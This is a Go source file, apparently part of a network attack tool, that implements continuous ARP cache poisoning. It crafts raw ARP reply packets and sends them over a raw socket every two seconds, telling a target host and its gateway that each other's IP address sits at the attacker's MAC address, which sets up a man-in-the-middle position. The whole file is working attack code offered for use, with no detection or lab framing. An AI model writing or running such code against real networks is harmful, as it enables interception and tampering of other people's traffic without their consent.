package spoof

import (
	"encoding/binary"
	"fmt"
	"net"
	"syscall"
	"time"
)

// Converts a MAC address to a byte slice
func macToBytes(mac net.HardwareAddr) []byte {
	return []byte(mac)
}

// Converts an IP address to a byte slice (IPv4)
func ipToBytes(ip net.IP) []byte {
	return ip.To4()
}

// htons converts a uint16 from host to network byte order
func htons(i uint16) uint16 {
	return (i<<8)&0xff00 | i>>8
}

// Constructs a complete Ethernet + ARP packet
func buildARPPacket(senderMAC, targetMAC net.HardwareAddr, senderIP, targetIP net.IP, opcode uint16) []byte {
	packet := make([]byte, 42) // Ethernet header (14 bytes) + ARP packet (28 bytes)

	// Ethernet header
	copy(packet[0:6], targetMAC)  // Destination MAC
	copy(packet[6:12], senderMAC) // Source MAC
	packet[12] = 0x08             // EtherType (ARP)
	packet[13] = 0x06

	// ARP header
	binary.BigEndian.PutUint16(packet[14:16], 1)      // Hardware type (Ethernet)
	binary.BigEndian.PutUint16(packet[16:18], 0x0800) // Protocol type (IPv4)
	packet[18] = 6                                    // Hardware size
	packet[19] = 4                                    // Protocol size
	binary.BigEndian.PutUint16(packet[20:22], opcode) // Opcode (1=request, 2=reply)

	copy(packet[22:28], senderMAC)      // Sender MAC
	copy(packet[28:32], senderIP.To4()) // Sender IP
	copy(packet[32:38], targetMAC)      // Target MAC
	copy(packet[38:42], targetIP.To4()) // Target IP

	return packet
}

// Sends a raw ARP packet using a raw socket
func sendARP(iface *net.Interface, packet []byte, targetMAC net.HardwareAddr) error {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0806)))
	if err != nil {
		return fmt.Errorf("socket error: %v", err)
	}
	defer syscall.Close(fd)

	addr := syscall.SockaddrLinklayer{
		Protocol: htons(0x0806),
		Ifindex:  iface.Index,
		Halen:    6,
	}
	copy(addr.Addr[:], targetMAC)

	err = syscall.Sendto(fd, packet, 0, &addr)
	if err != nil {
		return fmt.Errorf("sendto error: %v", err)
	}
	return nil
}

// Spoof performs continuous ARP poisoning
func Spoof(iface *net.Interface, targetIP net.IP, targetMAC net.HardwareAddr, gatewayIP net.IP, gatewayMAC net.HardwareAddr) {
	attackerMAC := iface.HardwareAddr

	fmt.Println("[*] Starting ARP spoofing... Press Ctrl+C to stop.")

	for {
		// Poison target: "Gateway is at our MAC"
		packet1 := buildARPPacket(attackerMAC, targetMAC, gatewayIP, targetIP, 2)
		if err := sendARP(iface, packet1, targetMAC); err != nil {
			fmt.Printf("[!] Failed to send ARP to target: %v\n", err)
		}

		// Poison gateway: "Target is at our MAC"
		packet2 := buildARPPacket(attackerMAC, gatewayMAC, targetIP, gatewayIP, 2)
		if err := sendARP(iface, packet2, gatewayMAC); err != nil {
			fmt.Printf("[!] Failed to send ARP to gateway: %v\n", err)
		}

		fmt.Println("[+] Sent spoofed ARP packets")

		time.Sleep(2 * time.Second)
	}
}
